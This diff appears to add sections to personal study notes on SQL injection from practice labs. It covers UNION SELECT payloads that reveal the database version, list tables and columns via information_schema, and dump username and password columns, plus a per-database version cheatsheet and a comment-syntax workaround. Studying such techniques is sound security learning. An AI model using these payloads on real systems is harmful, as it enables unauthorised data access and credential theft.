@@ -111,3 +111,73 @@ administrator~s3cure
 wiener~peter
 carlos~montoya
 ...
+
+
+
+
+>>>.... 4) Querying the database type and version
+
+' UNION SELECT @@version--
+
+Output: 
+	Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+	Mar 18 2018 09:11:49
+	Copyright (c) Microsoft Corporation
+	Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
+
+
+CHEATSHEET:
+Database type 	    Query
+Microsoft, MySQL 	SELECT @@version
+Oracle 	            SELECT * FROM v$version
+PostgreSQL 	        SELECT version() 
+
+
+
+
+>>>.... 5) Using the comment 
+
+Sometimes the - (hyphen) doesn't work
+
+so use the # (hash) at the end
+
+for eg: 
+' ORDER BY 1-- (doesn't work)
+' ORDER BY 1# (worked)
+
+
+
+>>>.... 6) Listing the contents of the database
+
+SELECT * FROM information_schema.<table_name>
+
+SELECT * FROM information_schema.columns WHERE table_name = '<table_name>'
+
+
+' UNION SELECT table_name, NULL FROM information_schema.tables-- 
+
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_yvttri'--
+
+' UNION SELECT username_jjpbzp, password_ncmjls FROM users_yvttri--
+
+
+> SQLi — retrieve table names:
+
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+
+> SQLi — retrieve column names from a specific table:
+
+' UNION SELECT column_name, NULL FROM information_schema.columns
+WHERE table_name = 'users_yvttri'--
+
+> SQLi — retrieve data from the identified table:
+
+' UNION SELECT username_jjpbzp, password_ncmjls
+FROM users_yvttri--
+
+			The flow to remember
+				1. Find tables
+				   ↓
+				2. Find columns in the interesting table
+				   ↓
+				3. Retrieve data from those columns
